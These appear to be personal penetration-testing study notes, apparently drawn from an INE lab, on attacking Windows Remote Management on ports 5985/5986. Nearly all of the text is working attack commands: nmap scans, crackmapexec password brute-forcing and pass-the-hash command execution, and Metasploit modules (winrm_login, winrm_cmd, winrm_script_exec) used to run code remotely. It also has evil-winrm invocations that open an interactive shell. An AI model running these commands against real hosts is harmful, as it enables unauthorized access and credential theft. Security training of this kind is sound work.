WinRM default port number is 5985

#### Nmap scan for determine the port winrm
```
nmap -sS -sV -sC -v 10.5.26.214 -p 5985 
```
or
```
nmap --top-ports 7000 <target_ip>
```

##### Use `crackmapexec` for Bruteforce the username and password 
```
crackmapexec winrm 10.5.26.214 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

#### Take connection of the protocol
```
crackmapexec winrm 10.5.26.214 -u administrator -p tinkerbell -x "net user"
```

--------------------



### Use Metasploit for exploitation 


This is very important to know, before we try to connect to the WinRM service. We need to use a valid authentication method while connecting to the service. You can find more information about the authentication from the below link: https://docs.microsoft.com/en-us/windows/win32/winrm/authentication-for-remote-connections
```
use auxiliary/scanner/winrm/winrm_auth_methods
set RHOSTS demo.ine.local
exploit
```

##### We will run the metasploit winrm_login module to find the valid users and their passwords.
```
msfconsole -q
use auxiliary/scanner/winrm/winrm_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set PASSWORD anything
exploit
```
 We are setting the PASSWORD because in the recent version of the "winrm_login" module, the PASSWORD option is required unless using Kerberos authentication. Metasploit will still use the USERPASS_FILE file.

##### Execute command on the target server using winrm_cmd module.
```
use auxiliary/scanner/winrm/winrm_cmd
set RHOSTS demo.ine.local
set USERNAME administrator
set PASSWORD tinkerbell
set CMD whoami
exploit
```

##### Now use metasploit module for exploit winrm
```
search winrm_script
use exploit/windows/winrm/winrm_script_exec
show options
setg rhosts <target_ip>
set username administrator
set password tinkerbell
exploit
```

# Exploiting WinRM 
-> windows remote management protocol
-> _5985 / 5986_ PORTs 
#winrm
###### Tools
-> _crackmapexec_ : to perform a brute-force
`crackmapexec winrm IP -u administrator -p /usr/pass_list.txt`
`crackmapexec winrm IP -u administrator -p PASSWORD -x "COMMAND"`
`crackmapexec winrm IP -u administrator -H password_hash(LM/NTML) -x "COMMAND"`

-> *evil_winrm* : ruby scrip to obtain a command shell.
`evil-winrm.rb -u USERNAME -p PASSWORD -i IP` : enjoy your shell.

##### steps to hack with MSF
1. first , check out the authentication methods supported by the  winRM on the target.
	-> `/auxiliary/scanner/winrm/winrm_auth_methods`
2. If , _basic auth method_ is there then we can brute force it 
	-> `/auxiliary/scanner/winrm/winrm_login`
3. After getting username and password , we can execute the commands 
	-> `/auxiliary/scanner/winrm/winrm_cmd`
4. Module which provide _REMOTE CODE EXECUTION_
	-> `/auxiliary/scanner/winrm/winrm_script_exec`
	-> Don't forgot to `set FORCE_VBS TRUE` , set it on true
